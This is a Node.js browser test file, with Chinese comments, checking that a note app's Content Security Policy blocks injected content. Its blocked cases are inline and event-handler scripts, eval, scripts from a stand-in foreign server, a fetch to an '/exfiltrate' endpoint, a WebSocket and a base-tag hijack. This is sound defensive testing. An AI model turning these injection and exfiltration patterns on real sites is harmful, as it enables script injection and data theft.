import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import crypto from 'node:crypto';
import assert from 'node:assert/strict';
import {spawn} from 'node:child_process';
import {launchBrowser} from './browser.mjs';
import {waitForApp,waitForNote,waitForSaved} from './waits.mjs';
import {contentSecurityPolicy} from '../server/content-security.js';

const ROOT=path.resolve(import.meta.dirname,'..'),HOME=fs.mkdtempSync(path.join(os.tmpdir(),'tracery-csp-')),VAULT=path.join(HOME,'vault'),PORT=9673,BASE='http://127.0.0.1:'+PORT;
fs.mkdirSync(VAULT);
const note='# CSP fixture\n\nNormal **bold** [[other]]\n\n![[sample.svg]]\n';
fs.writeFileSync(path.join(VAULT,'note.md'),note);fs.writeFileSync(path.join(VAULT,'other.md'),'# other');
fs.writeFileSync(path.join(VAULT,'payload.js'),'globalThis.__vaultExecuted=true;');
fs.writeFileSync(path.join(VAULT,'payload.html'),'<script>globalThis.__htmlExecuted=true</script>');
fs.writeFileSync(path.join(VAULT,'sample.svg'),'<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="red"/><script>globalThis.__svgExecuted=true</script></svg>');
fs.writeFileSync(path.join(HOME,'tracery.config.json'),JSON.stringify({currentVault:VAULT,settings:{startup:'empty',themeMode:'light'}}));
let foreignRequests=0;
const foreign=http.createServer((req,res)=>{foreignRequests++;res.end('globalThis.__foreignExecuted=true;');});
await new Promise(resolve=>foreign.listen(0,'127.0.0.1',resolve));const foreignURL='http://127.0.0.1:'+foreign.address().port;
const server=spawn(process.execPath,[path.join(ROOT,'server/server.js')],{env:{...process.env,PORT:String(PORT),TRACERY_HOME:HOME},windowsHide:true,stdio:'ignore'});
let browser;
try {
  for(let i=0;i<100;i++){try{if((await fetch(BASE+'/api/state')).ok)break;}catch{}await new Promise(resolve=>setTimeout(resolve,100));}
  for(const route of ['/','/index.html','/cmlab.html','/a-spa-fallback']){
    const response=await fetch(BASE+route),html=await response.text(),policy=response.headers.get('content-security-policy');
    assert.equal(response.status,200);assert.match(policy,/script-src 'self'/);assert.ok(!policy.includes("'unsafe-eval'"));
    assert.ok(!policy.match(/script-src [^;]*'unsafe-inline'/));
    const inline=[...html.replace(/\r\n?/g,'\n').matchAll(/<script type="importmap">([\s\S]*?)<\/script>/g)];
    assert.equal(inline.length,1);for(const match of inline)assert.ok(policy.includes("'sha256-"+crypto.createHash('sha256').update(match[1]).digest('base64')+"'"));
  }
  const unix='<script type="importmap">\n{"imports":{}}\n</script>';assert.equal(contentSecurityPolicy(BASE,unix),contentSecurityPolicy(BASE,unix.replaceAll('\n','\r\n')));
  for(const name of ['payload.js','payload.html']){const response=await fetch(BASE+'/api/file?path='+name);assert.equal(response.headers.get('content-type'),'application/octet-stream');assert.equal(response.headers.get('content-disposition'),'attachment');}
  const svg=await fetch(BASE+'/api/file?path=sample.svg');assert.match(svg.headers.get('content-security-policy'),/script-src 'none'/);
  console.log('PASS 页面/importmap 哈希含 CRLF、SPA 回退、活动附件下载与 SVG 独立策略');
  browser=await launchBrowser({width:1440,height:900});const page=await browser.newPage(),errors=[];
  page.on('pageerror',error=>errors.push(error.message));await page.bringToFront();
  await page.evaluateOnNewDocument(()=>{globalThis.__cspViolations=[];document.addEventListener('securitypolicyviolation',event=>globalThis.__cspViolations.push({directive:event.effectiveDirective,blocked:event.blockedURI}));});
  await page.goto(BASE,{waitUntil:'domcontentloaded'});await waitForApp(page);await page.evaluate(()=>window.__tracery.openNote('note.md'));await waitForNote(page,'note.md',note);
  await page.waitForFunction(()=>[...document.images].some(image=>image.src.includes('sample.svg')&&image.complete&&image.naturalWidth===20));
  assert.deepEqual(await page.evaluate(()=>globalThis.__cspViolations),[]);
  await page.setRequestInterception(true);
  page.on('request',request=>{
    if(new URL(request.url()).searchParams.has('csp-probe'))request.respond({status:200,contentType:'text/javascript',body:'try { eval("globalThis.__evalExecuted=true;"); } catch {}'});
    else request.continue();
  });
  // DOM 注入发生在浏览器页内；断言靠 CSP 的违规事件和服务器实际请求计数。
  await page.evaluate(foreignURL=>{
    const inline=document.createElement('script');inline.textContent='globalThis.__inlineExecuted=true;';document.head.append(inline);
    const button=document.createElement('button');button.setAttribute('onclick','globalThis.__handlerExecuted=true;');document.body.append(button);button.click();button.remove();
    const allowed=document.createElement('script');allowed.src='/js/reconnect.js?csp-probe=1';document.head.append(allowed);
    for(const src of [foreignURL+'/evil.js',foreignURL+'/evil.mjs','/api/file?path=payload.js']){
      const script=document.createElement('script');script.src=src;if(src.endsWith('.mjs'))script.type='module';document.head.append(script);
    }
    fetch(foreignURL+'/exfiltrate').catch(()=>{});
    const socket=new WebSocket(foreignURL.replace('http:','ws:')+'/socket');socket.onerror=()=>{};
    const base=document.createElement('base');base.href=foreignURL+'/';document.head.append(base);
  },foreignURL);
  try { await page.waitForFunction(()=>globalThis.__cspViolations.some(row=>row.directive==='script-src-attr')&&globalThis.__cspViolations.filter(row=>row.directive==='script-src-elem').length>=3&&globalThis.__cspViolations.some(row=>row.blocked==='eval')&&globalThis.__cspViolations.filter(row=>row.directive==='connect-src').length>=2&&globalThis.__cspViolations.some(row=>row.directive==='base-uri')); }
  catch(error){console.error('CSP 实际违规事件',await page.evaluate(()=>globalThis.__cspViolations));throw error;}
  assert.equal(foreignRequests,0);
  assert.deepEqual(await page.evaluate(()=>[globalThis.__inlineExecuted,globalThis.__handlerExecuted,globalThis.__evalExecuted,globalThis.__vaultExecuted,globalThis.__foreignExecuted].map(Boolean)),[false,false,false,false,false]);
  assert.equal(await page.evaluate(()=>document.baseURI),BASE+'/');
  // 正常保存、API 和同源 WebSocket 仍工作。
  await page.evaluate(()=>{const editor=window.__tracery.editor;editor.setMode('source');editor.setAutosave(0);editor.insertText('safe edit\n');});
  const expected=await page.evaluate(()=>window.__tracery.editor.getContent());await waitForSaved(page,'note.md',expected);
  await page.evaluate(()=>new Promise((resolve,reject)=>{const ws=new WebSocket(location.origin.replace('http:','ws:')+'/ws');ws.onopen=()=>{ws.close();resolve(true);};ws.onerror=()=>reject(Error('same-origin WebSocket blocked'));}));
  console.log('PASS 浏览器阻止内联/事件/eval/外站脚本和连接/仓库 JS，正常图片、保存和 WebSocket 可用');
  const offline=await browser.newPage();await offline.goto(BASE+'/offline.html',{waitUntil:'domcontentloaded'});
  const navigation=offline.waitForNavigation({waitUntil:'domcontentloaded'});await offline.click('[data-reconnect]');await navigation;
  assert.equal(offline.url(),BASE+'/offline.html');assert.deepEqual(errors,[]);
  const svgPage=await browser.newPage();await svgPage.goto(BASE+'/api/file?path=sample.svg',{waitUntil:'domcontentloaded'});assert.equal(await svgPage.evaluate(()=>Boolean(globalThis.__svgExecuted)),false);
  console.log('PASS 离线页使用外部事件脚本，重新连接按钮仍可实际重载');
}finally{await browser?.close();server.kill();await new Promise(resolve=>foreign.close(resolve));}
